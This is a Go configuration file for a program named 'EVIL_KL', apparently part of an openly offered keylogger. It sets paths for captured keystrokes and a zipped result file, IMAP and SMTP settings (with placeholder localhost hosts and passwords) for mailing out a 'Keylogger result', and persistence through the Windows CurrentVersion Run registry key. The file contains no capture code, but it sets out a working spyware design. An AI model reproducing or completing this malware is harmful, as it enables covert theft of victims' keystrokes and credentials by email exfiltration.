package config

/*
Create <Config> - init Config structure
IT IS PREFERABLE TO USE ABSOLUTE FILE PATH
	Returns <*Config>:
		1. object's pointer
*/
func (c *Config) Create() *Config {
	c = &Config{
		cfg: Cfg{
			Service: Service{
				Name: "EVIL_KL",
				ID:   "ec871226-7f5b-425b-bad4-f52fb6577d1f",
			},
			Logger: Logger{
				Path:  "C:\\temp\\evil-kl\\servicelogs\\logs.txt",
				Level: 0,
			},
			Mail: Mail{
				IMAP: IMAP{
					Username:      "imapuser@test.ru",
					Password:      "password",
					Host:          "localhost",
					Port:          993,
					IncomingBox:   "INBOX",
					CheckInterval: 10,
				},
				SMTP: SMTP{
					Username: "smtpuser@test.ru",
					Password: "password",
					Host:     "localhost",
					Port:     25,
					Name:     "some-user-name",
					From:     "from@mail.ru",
					Subject:  "Keylogger result",
				},
			},
			Keylogger: Keylogger{
				Path: "C:\\temp\\evil-kl\\keylogger\\keylogger.txt",
			},
			Zipper: Zipper{
				Path: "C:\\temp\\evil-kl\\result.zip",
			},
			Installer: Installer{
				ServicePath: "C:\\temp\\evil-kl\\evil-kl.exe",
				RegPath:     "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
				RegName:     "evil-kl",
			},
		},
	}

	return c
}

/*
GetConfig <Config> - getting a config of service
	Returns <Cfg>:
		1. config object
*/
func (c *Config) GetConfig() Cfg {
	return c.cfg
}
